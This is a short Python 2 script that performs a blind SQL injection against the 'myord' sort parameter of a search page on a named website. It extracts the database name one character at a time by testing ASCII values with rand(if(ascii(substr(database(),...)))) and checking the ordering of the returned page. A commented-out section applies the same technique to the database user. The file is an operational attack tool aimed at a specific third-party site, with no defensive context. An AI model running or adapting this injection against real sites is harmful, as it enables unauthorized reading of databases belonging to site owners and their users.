#!/usr/bin/python
# -*- coding: utf-8 -*-
import requests
import re
import os
data=''
datas=''
    # print 'Now the data is: ' + data
    # print 'Start injecting the ' + str(i) + ' character'
    # print 'Try ascii code: '+str(j)+'...'
    # try:
    #     response = requests.get(url)
    #     if int(re.findall('<a href="../news/html/\?(.*?).html', response.content)[0]) == 766:
    #         print '!!!!!!!!success '+url
    # except:
    #     d=1+1

for i in range(1,21):
    for j in range(48,123):
        print 'Now the ascii is: ' + data
        print 'Now the data is: '+datas
        print 'Start injecting the ' + str(i) + ' character'
        print 'Try ascii code: '+str(j)+'...'
        url='http://www.dayxxx.com//search/index.php?catid=&key=1&myord=rand(if(ascii(substr(database(),'+str(i)+',1))='+str(j)+',1,0))%23&myshownums=&page=7'
        response = requests.get(url,timeout=20)
        if int(re.findall('<a href="../news/html/\?(.*?).html', response.content)[0]) == 766:
            data+=' '
            data+=str(j)
            datas+=chr(j)
            break
        c=os.system('cls')
print 'the final ascii is: '+data
print 'the final data is: '+datas
# threads=[]
# thread_count=len(urls)
# for i in range(thread_count):
#     t=threading.Thread(target=sql,args=(urls[i],))
#     threads.append(t)
# for i in range(thread_count):
#     threads[i].start()
# for i in range(thread_count):
#     threads[i].join


print 'the final data is: '+data
# url='http://www.dayxxx.com//search/index.php?catid=&key=1&myord=rand(if(ascii(substr(user(),15,1))=116,1,0))%23&myshownums=&page=7'
# response=requests.get(url)
# response_array=re.findall('<a href="../news/html/\?(.*?).html',response.content)
# print type(int(response_array[0]))
# num=int(response_array[0])
# print num
# # num1='937'
# if int(re.findall('<a href="../news/html/\?(.*?).html',response.content)[0])==766:
#     print '766 success'
